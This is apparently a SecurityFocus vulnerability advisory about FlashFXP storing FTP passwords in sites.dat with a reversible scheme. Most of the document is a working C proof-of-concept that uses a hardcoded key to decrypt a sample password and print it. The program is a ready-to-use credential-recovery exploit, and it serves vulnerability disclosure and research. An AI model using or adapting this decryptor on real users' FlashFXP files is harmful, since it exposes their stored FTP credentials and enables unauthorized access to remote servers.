source: http://www.securityfocus.com/bid/7499/info

FlashFXP uses a trivially reversible algorithm to encrypt FTP user credentials. Local attackers with access to the sites.data may exploit this weakness to gain unauthorized access to FTP user credentials for remote sites.

/* Flashfxp sites.dat decryption
 * By: Dvdman@l33tsecurity.com
 * L33tsecurity 2003
*/
#include <math.h>
#include <stdio.h>
#include <stdlib.h>

#define VERSION 1


char magic[] ={ 0x79,0x41,0x33, 0x36, 0x7A, 0x41, 0x34 ,0x38, 0x64, 0x45 ,0x68, 0x66, 0x72, 0x76, 0x67 ,0x68,
0x47, 0x52, 0x67, 0x35, 0x37, 0x68, 0x35, 0x55, 0x6C ,0x44 ,0x76, 0x33 ,0x00 ,0x00 ,0x00, 0x00, };

char b[]={ 0x36,0xd8,0x7f,0xc2,0x07,0x16,0xc3};
                     /* kernel */

//char b[]={ 0x74, 0x92, 0x43 ,0x9C, 0x25, 0xEE ,0x27, 0xA1, 0x2D, 0xC2, 0x77, 0x84,};


int main(int argc, char **argv)
{
        unsigned char temp;
        unsigned char out[128];
        int i;
        temp = b[0];
        for (i = 1; i < sizeof(b); i++)
        {
                out[i - 1] = (b[i] ^ magic[i - 1]) - temp - (i + 1) % 2;
                temp = b[i % 29];
        };

        out[i - 1] = 0;
        printf("DECRYPTED PASSWORD IS: %s\n",(char *)&out);
        return 0;
}

